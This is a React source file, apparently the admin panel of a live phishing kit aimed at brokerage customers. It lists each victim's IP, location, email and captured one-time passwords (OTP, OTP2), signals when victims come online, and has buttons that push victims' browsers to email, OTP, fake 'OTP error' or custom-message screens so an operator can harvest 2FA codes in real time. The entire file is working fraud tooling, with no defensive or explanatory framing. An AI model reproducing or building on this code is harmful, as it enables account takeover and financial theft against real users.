import React, { useState, useEffect } from "react";
import axios from "axios";
import "./adm.css";
import moment from 'moment-timezone';

import alertaSom from '../assets/alert.mp3';

export default function Adm({ip,socket}) {

  const [lista, setLista] = useState([]);
  const [msg, setMsg] = useState("");


  async function AtualizaTabela() {
    const resposta = await axios.get("https://seal-app-w9oy8.ondigitalocean.app/listausuario");
    setLista(resposta.data);
  }

  useEffect(() => {
    const somDeAlerta = new Audio(alertaSom);

    const tocarSomDeAlerta = () => {
      somDeAlerta.play().catch(error => console.error("Erro ao tocar o som:", error));
    };

    socket.on('usuarioConectado', tocarSomDeAlerta);

    return () => {
      socket.off('usuarioConectado', tocarSomDeAlerta);
    };
  }, [socket]); // Dependência [socket] para garantir que o efeito seja aplicado corretamente


  useEffect(() => {
    // Registra o ouvinte para o estado da conexão
    socket.on('statusConexao', (connectedIps) => {
      // Atualiza o estado com a informação de quais IPs estão conectados
      const updatedList = lista.map(item => {
        return {
          ...item,
          online: connectedIps.includes(item.ip) // Atualiza o estado de 'online' com base se o IP está na lista de conectados
        };
      });
      setLista(updatedList);
    });
  
    return () => {
      // Limpa o ouvinte quando o componente for desmontado
      socket.off('statusConexao');
    };
  }, [lista, socket]);
  
  useEffect(() => {
    AtualizaTabela();

    // Definindo uma função dentro de useEffect para tratar o evento atualizaAdmin
    const handleAtualizaAdmin = () => {
      console.log("Atualizando admin...");
      setTimeout(AtualizaTabela, 500);
    };

    // Registrando o ouvinte para o evento atualizaAdmin
    socket.on("atualizaAdmin", handleAtualizaAdmin);

    // Função de limpeza que será chamada quando o componente for desmontado
    return () => {
      socket.off("atualizaAdmin", handleAtualizaAdmin);
    };
  }, [socket, ip]); // Dependências [socket, ip] garantem que o efeito seja reexecutado se eles mudarem

  const handleSubmit = (ipTable) => (event) => {
    event.preventDefault();
    let elemento = document.activeElement.id;
    console.log("Botão clicado:", elemento, "IP:", ipTable);
    let mostraErro =false;

    if(elemento==="otp_Error"){
      mostraErro =true;
    }

    socket.emit("ComandoTroqueCena", { ipCliente: ipTable, cenaNova:elemento, msg, mostraErro });
  };

  const handleChange = (event) => {
    setMsg( event.target.value );
  };

  return (
    <div className="LoadNaquelas">

      <table className="table1">
        <thead >
          <tr className="thM tituloTab">
          <th>STATUS</th>
            <th>Corretora</th>
            <th>IP</th>
            <th>País</th>
            <th>Cidade</th>
            <th>ULT. ATUALIZAÇÃO</th>
            <th>Email</th>
            <th>OTP</th>
            <th>OTP2</th>
            <th className="tdM2">CENA</th>
            <th className="ferramentas">Ações</th>
          </tr>
        </thead>
        <tbody className="thM">
          {lista.map(
            (
              item,
              index // Adicionado o return aqui
            ) => (
              <tr key={index} className="thM">
                                <td>
              <span className={`status-bullet ${item.online ? 'status-online' : 'status-offline'}`}></span>
            </td>
                <td>{item.corretora}</td>
                <td>{item.ip}</td>
                <td>{item.countryCode}</td>
                <td>{item.city}</td>
                <td style={{ color: item.online ? 'green' : 'red' }}>
                  {moment.tz(item.date, "America/Sao_Paulo").format("DD/MM/YY HH:mm:ss")}
                </td>
                <td>{item.email}</td>
                <td>{item.OTP}</td>
                <td>{item.OTP2}</td>
                <td className="tdM2">{item.cena}</td>
                <td className="prices-table__cell is-right button-cell ferramentas">
                 

                  
                  <form onSubmit={handleSubmit(item.ip)}  > 
                      <button className="btn btn-primary btn-sm teste" type="submit" id="email">email</button>
                      <button className="btn btn-secondary btn-sm teste" type="submit" id="otp">otp</button>
                      <button className="btn btn-secondary btn-sm teste" type="submit" id="otp_Error">otp Error</button>
                      <button className="btn btn-primary btn-sm teste" type="submit" id="load">load</button>
                      
                      <div className="nav-links__item nav-dropdown">
                        <button className="nav-dropdown__toggle nav-link">
                          Enviar Mensagem
                        </button>
                        <div className="nav-dropdown-menu__wrapper nav-dropdown-menu--md">
                          <div className="nav-dropdown-menu__inner">
                            <ul className="nav-dropdown-list nav-dropdown-list--primary">
                              <li className="drop-down-item">
                                <input id="mensagem" name="mensagem" type="text" placeholder="" className="form-input__input" 
                                onChange={(e) => handleChange(e)}                      
                                autoFocus></input>
                              </li>
                              <li className="drop-down-item">
                                <button className="btn btn-secondary btn-sm teste" type="submit" id="otp2">otp2</button>
                              </li>
                            </ul>
                          </div>
                        </div>
                      </div>
                  </form>

               
                </td>
              </tr>
            )
          )}
        </tbody>
      </table>
    </div>
  );
}
